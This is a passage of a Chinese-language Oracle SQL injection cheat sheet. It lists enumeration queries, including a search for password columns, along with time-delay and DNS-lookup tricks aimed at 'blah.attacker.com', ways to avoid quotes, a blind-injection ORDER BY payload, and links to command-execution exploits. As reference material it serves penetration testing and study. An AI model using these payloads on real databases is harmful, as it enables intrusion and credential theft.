-<pre><code>SELECT global_name FROM global_name;
-SELECT name FROM v$database;
-SELECT instance_name FROM v$instance;
-SELECT SYS.DATABASE_NAME FROM DUAL;
-</code></pre>
-
-<p>列出数据库：</p>
-
-<pre><code>SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)
-</code></pre>
-
-<p>– 通过查询TNS监听程序能够查询到其他数据库.详情看<a href="http://www.jammed.com/%7Ejwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>。</p>
-
-<p>列出字段名：</p>
-
-<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
-SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
-</code></pre>
-
-<p>列出表名：</p>
-
-<pre><code>SELECT table_name FROM all_tables;
-SELECT owner, table_name FROM all_tables;
-</code></pre>
-
-<p>通过字段名找到对应表：</p>
-
-<pre><code>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
-</code></pre>
-
-<p>— 注: 表名都是大写</p>
-
-<p>查询第N行：</p>
-
-<pre><code>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)
-</code></pre>
-
-<p>查询第N个字符：</p>
-
-<pre><code>SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’
-</code></pre>
-
-<p>按位与(Bitwise AND)：</p>
-
-<pre><code>SELECT bitand(6,2) FROM dual; — 返回2
-SELECT bitand(6,1) FROM dual; — 返回0
-</code></pre>
-
-<p>ASCII值转字符：</p>
-
-<pre><code>SELECT chr(65) FROM dual; — 返回A
-</code></pre>
-
-<p>字符转ASCII码：</p>
-
-<pre><code>SELECT ascii(‘A’) FROM dual; — 返回65
-</code></pre>
-
-<p>类型转换：</p>
-
-<pre><code>SELECT CAST(1 AS char) FROM dual;
-SELECT CAST(’1′ AS int) FROM dual;
-</code></pre>
-
-<p>拼接字符：</p>
-
-<pre><code>SELECT ‘A’ || ‘B’ FROM dual; — 返回AB
-</code></pre>
-
-<p>IF语句：</p>
-
-<pre><code>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 
-</code></pre>
-
-<p>— 跟SELECT语句在一起时不太管用</p>
-
-<p>Case语句：</p>
-
-<pre><code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
-SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2
-</code></pre>
-
-<p>绕过引号：</p>
-
-<pre><code>SELECT chr(65) || chr(66) FROM dual; — 返回AB
-</code></pre>
-
-<p>延时：</p>
-
-<pre><code>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
-SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
-SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
-SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢
-</code></pre>
-
-<p>— 更多关于延时的内容请看<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a></p>
-
-<p>发送DNS请求：</p>
-
-<pre><code>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
-SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
-</code></pre>
-
-<p>命令执行：</p>
-
-<p>如果目标机装了JAVA就能执行命令，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">看这里</a></p>
-
-<p>有时候ExtProc也可以，不过我一般都成功不了，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">看这里</a></p>
-
-<p>本地文件读取：</p>
-
-<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>有时候能用。如果下面的语句没有返回null就行。</p>
-
-<pre><code>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
-</code></pre>
-
-<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">JAVA</a>能用来读取和写入文件，除了Oracle Express</p>
-
-<p>主机名称、IP地址：</p>
-
-<pre><code>SELECT UTL_INADDR.get_host_name FROM dual;
-SELECT host_name FROM v$instance;
-SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
-SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称
-</code></pre>
-
-<p>定位DB文件：</p>
-
-<pre><code>SELECT name FROM V$DATAFILE;
-</code></pre>
-
-<p>默认系统和数据库：</p>
-
-<pre><code>SYSTEM
-SYSAUX
-</code></pre>
-
-<h3 id="toc_0">额外小贴士：</h3>
-
-<p>一个字符串列出所有表名：</p>
-
-<pre><code>select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,&#39;) from all_tables 
-</code></pre>
-
-<p>– 当你union联查注入的时候只有一行能用与返回数据时使用</p>
-
-<p>盲注排序：</p>
-
-<pre><code>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 
-</code></pre>
-
-<p>— 你必须知道两个拥有相同数据类型的字段名才能用</p>
 
 ]]></content>
   </entry>
